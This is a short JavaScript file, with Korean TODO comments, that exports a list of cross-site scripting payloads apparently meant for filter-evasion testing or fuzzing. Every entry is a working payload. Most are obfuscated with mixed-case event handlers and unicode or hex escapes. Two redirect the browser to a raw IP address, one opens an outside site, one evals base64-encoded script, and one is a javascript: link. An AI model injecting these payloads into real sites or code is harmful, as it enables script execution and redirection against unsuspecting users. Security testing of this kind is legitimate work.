// ToDo
// 1. HTMl 태그 랜덤 기능
// 2. 속성명 랜덤 기능
export const xssPayloads = [
  `<p onpoinTerOver=\u006cocation = \`\u0068tt\x70\x3a\x2f/211.236.179.244\`/>`,
  "<img src=x onPointerOver=\u0077indow.\u006fpen`htt\x70\u003a//www.cyberone.kr`;/>",
  `<a href="javascript:alert\`xss\`">dd</a>`,
  `<h1 onPoINTerovER=\u006cocation = \`\u0068tt\x70\x3a\x2f/211.236.179.244\`>`,
  `<img src=z onPoinTerOVeR=\u0065val(\u0061tob(\`YWxlcnQoImFsZXJ0Iik7\`));>`,
];
